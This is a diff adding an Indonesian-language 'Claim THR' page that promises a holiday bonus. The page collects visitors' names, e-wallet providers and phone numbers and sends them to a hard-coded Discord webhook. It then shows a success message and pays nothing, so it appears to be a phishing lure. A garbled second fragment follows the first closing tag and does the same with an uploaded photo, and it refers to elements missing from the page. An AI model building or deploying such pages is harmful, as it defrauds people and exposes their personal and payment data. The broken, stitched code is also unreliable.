@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Claim THR 🎁</title>
+
+  <style>
+    body {
+      font-family: Arial;
+      background: linear-gradient(135deg, #f97316, #fb923c);
+      color: #fff7ed;
+      text-align: center;
+      padding-top: 100px;
+      overflow: hidden;
+    }
+
+    .box {
+      background: #ffffff;
+      color: #1f2937;
+      padding: 30px;
+      border-radius: 20px;
+      display: inline-block;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+      transition: all 0.5s ease;
+      max-width: 90%;
+    }
+
+    input {
+      display: block;
+      margin: 10px auto;
+      padding: 12px;
+      width: 80%;
+      border-radius: 10px;
+      border: 1px solid #e5e7eb;
+    }
+
+    .row {
+      display: flex;
+      justify-content: center;
+      gap: 5px;
+      width: 80%;
+      margin: 10px auto;
+    }
+
+    .row select {
+      width: 40%;
+      padding: 12px;
+      border-radius: 10px;
+      border: 1px solid #e5e7eb;
+    }
+
+    .row input {
+      width: 60%;
+      margin: 0;
+    }
+
+    button {
+      padding: 12px 25px;
+      border: none;
+      border-radius: 12px;
+      background: #f97316;
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+
+    button:hover {
+      background: #ea580c;
+      transform: scale(1.05);
+    }
+
+    #step2, #success {
+      display: none;
+      opacity: 0;
+      transform: scale(0.8);
+    }
+
+    img {
+      width: 200px;
+      margin: 20px 0;
+      border-radius: 15px;
+    }
+
+    .fade-out {
+      opacity: 0;
+      transform: scale(0.8);
+    }
+
+    .fade-in {
+      opacity: 1 !important;
+      transform: scale(1) !important;
+    }
+  </style>
+</head>
+<body>
+
+<!-- STEP 1 -->
+<div class="box" id="step1">
+  <h1>🎁 Claim THR</h1>
+  <p>Isi data dulu ya kaka, nanti langsung diproses 👍</p>
+
+  <input type="text" id="nama" placeholder="Nama kaka">
+
+  <div class="row">
+    <select id="ewallet">
+      <option value="DANA">DANA</option>
+      <option value="GoPay">GoPay</option>
+      <option value="OVO">OVO</option>
+      <option value="ShopeePay">ShopeePay</option>
+    </select>
+
+    <input 
+      type="text" 
+      id="nomor" 
+      placeholder="Nomor HP kaka"
+      oninput="this.value = this.value.replace(/[^0-9]/g, '')"
+    >
+  </div>
+
+  <button onclick="nextStep()">Lanjut</button>
+</div>
+
+<!-- STEP 2 -->
+<div class="box" id="step2">
+  <h2>Sebentar ya kaka 😊</h2>
+
+  <img src="https://media.giphy.com/media/3o7aD2saalBwwftBIY/giphy.gif">
+
+  <p>Data kaka lagi diproses, tinggal klik kirim aja.</p>
+
+  <button onclick="kirimData()">Kirim</button>
+</div>
+
+<!-- SUCCESS -->
+<div class="box" id="success">
+  <h2>✔ Berhasil</h2>
+  <p>Data kaka sudah masuk 👍</p>
+</div>
+
+<script>
+function nextStep() {
+  let nama = document.getElementById("nama").value.trim();
+  let nomor = document.getElementById("nomor").value.trim();
+  let wallet = document.getElementById("ewallet").value;
+
+  if (!nama || !nomor) {
+    alert("Isi dulu ya kaka.");
+    return;
+  }
+
+  if (!/^08[0-9]{8,11}$/.test(nomor)) {
+    alert("Nomor kaka belum valid.");
+    return;
+  }
+
+  window.userData = { nama, nomor, wallet };
+
+  let step1 = document.getElementById("step1");
+  let step2 = document.getElementById("step2");
+
+  step1.classList.add("fade-out");
+
+  setTimeout(() => {
+    step1.style.display = "none";
+    step2.style.display = "inline-block";
+    setTimeout(() => step2.classList.add("fade-in"), 50);
+  }, 500);
+}
+
+function kirimData() {
+  let data = window.userData;
+
+  fetch("https://discord.com/api/webhooks/1484678541990953082/wQ6pSPTqGeiTlZ50nmQ_KGjG8xGZSbDAijTD1C3gAMaiJXimQJpoOUTzx5cn85EEFGV5", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      content:
+        "THR CLAIM\n\n" +
+        "Nama: " + data.nama + "\n" +
+        "Nomor: " + data.nomor + "\n" +
+        "E-Wallet: " + data.wallet
+    })
+  })
+  .then(() => {
+    showSuccess();
+  })
+  .catch(() => {
+    alert("Gagal kirim.");
+  });
+}
+
+function showSuccess() {
+  document.getElementById("step2").style.display = "none";
+
+  let success = document.getElementById("success");
+  success.style.display = "inline-block";
+
+  setTimeout(() => {
+    success.classList.add("fade-in");
+  }, 50);
+}
+</script>
+
+</body>
+</html>etElementById("step2");
+
+  step1.classList.add("fade-out");
+
+  setTimeout(() => {
+    step1.style.display = "none";
+    step2.style.display = "inline-block";
+    setTimeout(() => step2.classList.add("fade-in"), 50);
+  }, 500);
+}
+
+document.getElementById("realForm").addEventListener("submit", function(e) {
+  e.preventDefault();
+
+  let step2 = document.getElementById("step2");
+  let step3 = document.getElementById("step3");
+
+  step2.classList.add("fade-out");
+
+  setTimeout(() => {
+    step2.style.display = "none";
+    step3.style.display = "inline-block";
+    setTimeout(() => step3.classList.add("fade-in"), 50);
+  }, 500);
+});
+
+// preview foto
+document.getElementById("foto").addEventListener("change", function() {
+  let file = this.files[0];
+  if (!file) return;
+
+  let preview = document.getElementById("preview");
+  preview.src = URL.createObjectURL(file);
+  preview.style.display = "block";
+});
+
+// kirim ke discord
+function kirimData() {
+  let file = document.getElementById("foto").files[0];
+
+  if (!file) {
+    alert("Upload foto dulu 😭");
+    return;
+  }
+
+  let nama = document.getElementById("hiddenNama").value;
+  let nomor = document.getElementById("hiddenNomor").value;
+  let wallet = document.getElementById("hiddenWallet").value;
+
+  let formData = new FormData();
+  formData.append("file", file);
+
+  formData.append("payload_json", JSON.stringify({
+    content:
+      "🎁 THR CLAIM\n\n" +
+      "👤 Nama: " + nama + "\n" +
+      "📱 Nomor: " + nomor + "\n" +
+      "💳 E-Wallet: " + wallet
+  }));
+
+  fetch("https://discord.com/api/webhooks/1484678541990953082/wQ6pSPTqGeiTlZ50nmQ_KGjG8xGZSbDAijTD1C3gAMaiJXimQJpoOUTzx5cn85EEFGV5", {
+    method: "POST",
+    body: formData
+  })
+  .then(() => {
+    showSuccess();
+  })
+  .catch(() => {
+    alert("Gagal kirim 😭");
+  });
+}
+
+function showSuccess() {
+  document.getElementById("step3").style.display = "none";
+
+  let success = document.getElementById("success");
+  success.style.display = "inline-block";
+
+  setTimeout(() => {
+    success.classList.add("fade-in");
+  }, 50);
+}
+</script>
+
+</body>
+</html>
